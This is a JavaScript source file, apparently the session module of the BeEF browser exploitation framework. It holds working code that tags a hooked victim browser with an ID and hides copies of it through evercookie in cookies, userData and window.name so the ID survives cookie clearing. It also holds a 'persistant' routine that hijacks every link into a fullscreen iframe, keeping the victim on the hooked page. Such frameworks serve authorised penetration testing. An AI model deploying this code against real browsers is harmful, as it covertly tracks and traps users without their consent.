//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.session
 *
 * Provides basic session functions.
 */
beef.session = {
	
	hook_session_id_length: 80,
	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
	ec: new evercookie(),	
	
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
  	get_hook_session_id: function() {
		// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie("BEEFHOOK");
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata("BEEFHOOK");
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window("BEEFHOOK");
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},
	
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_hook_session_id: function(id) {
		// persist the hook session id
		this.ec.evercookie_cookie("BEEFHOOK", id);
		this.ec.evercookie_userdata("BEEFHOOK", id);
		this.ec.evercookie_window("BEEFHOOK", id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_hook_session_id: function() {
	    // init the return value
		var hook_session_id = "";
		
		// construct the random string 
		for(var i=0; i<this.hook_session_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
		}
		
		return hook_session_id;
	},

	/**
	 * Overrides each link, and creates an iframe (loading the href) instead of following the link
	 */
	persistant: function() {
		$j('a').click(function(e) {
			if ($j(this).attr('href') != '')
			{
				e.preventDefault();
				beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
				$j(document).attr('title', $j(this).html());
				document.body.scroll = "no";
				document.documentElement.style.overflow = 'hidden';
			}
		});
	}
	

				
};

beef.regCmp('beef.session');
